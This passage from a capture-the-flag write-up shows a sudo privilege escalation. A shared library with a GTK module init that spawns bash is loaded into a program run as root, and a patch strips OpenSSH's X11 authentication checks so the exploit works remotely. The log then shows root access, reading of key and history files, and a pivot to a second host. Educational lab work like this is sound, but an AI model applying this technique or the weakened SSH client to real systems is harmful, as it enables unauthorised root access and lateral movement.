#include <stdlib.h>
void gtk_module_init() {
	system("/bin/bash");
}
```

```
$ gcc -fPIC -shared -o lib/test.so test.c
$ sudo ./mapviewer --gtk-module `pwd`/lib/test.so
# whoami
root
```

## 7.<span id="a_part7"/> Remote pwnage


Now if we try remote:

```
$ ssh -Y  -i ident customer01@maps-as-a-service.challenges.adversary.zone -p 4141
customer01@maps-as-a-service:~$ sudo mapviewer --gtk-module /tmp/libtest.so
Unable to init server: Could not connect: Connection refused

(mapviewer:2577): Gtk-WARNING **: 11:48:28.377: cannot open display: 
customer01@maps-as-a-service:~$
```

It seems that the code running the module runs after the connection to an X server. How can we get the connection to succeed? Let's "remove the brakes" from the SSH client with this patch:



```diff
diff --git a/channels.c b/channels.c
index e4917f3..13725d6 100644
--- a/channels.c
+++ b/channels.c
@@ -1169,24 +1169,30 @@ x11_open_helper(struct ssh *ssh, struct sshbuf *b)
                return 0;
 
        /* Check if authentication protocol matches. */
+       /*
        if (proto_len != strlen(sc->x11_saved_proto) ||
            memcmp(ucp + 12, sc->x11_saved_proto, proto_len) != 0) {
                debug2("X11 connection uses different authentication protocol.");
                return -1;
        }
+       */
        /* Check if authentication data matches our fake data. */
+       /*
        if (data_len != sc->x11_fake_data_len ||
            timingsafe_bcmp(ucp + 12 + ((proto_len + 3) & ~3),
                sc->x11_fake_data, sc->x11_fake_data_len) != 0) {
                debug2("X11 auth data does not match fake data.");
                return -1;
        }
+       */
        /* Check fake data length */
+       /*
        if (sc->x11_fake_data_len != sc->x11_saved_data_len) {
                error("X11 fake_data_len %d != saved_data_len %d",
                    sc->x11_fake_data_len, sc->x11_saved_data_len);
                return -1;
        }
+       */
        /*
         * Received authentication protocol and data match
         * our fake data. Substitute the fake data with real
```

```
$ sudo apt-get source openssh
$ cd openssh-8.4p1
$ patch -p1 < patch.diff
$ make
....
$ ./ssh -Y   -i ../../ident customer01@maps-as-a-service.challenges.adversary.zone -p 4141

customer01@maps-as-a-service:~$ sudo mapviewer --gtk-module /tmp/libtest.so
root@maps-as-a-service:/home/customer01# cat ~/.ssh/id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAUuuihVpCbj6764HiweYlNwyfQgUVblpzyqj/IiWAno root@maps-as-a-service
root@maps-as-a-service:/home/customer01# cat ~/.bash_history 
ssh backup@maps-backups.challenges.adversary.zone
root@maps-as-a-service:/home/customer01# ssh backup@maps-backups.challenges.adversary.zone
Warning: Permanently added the ECDSA host key for IP address '135.181.53.101' to the list of known hosts.
PTY allocation request failed on channel 0
CS{sudo_+_GTK_=_pwn}
```


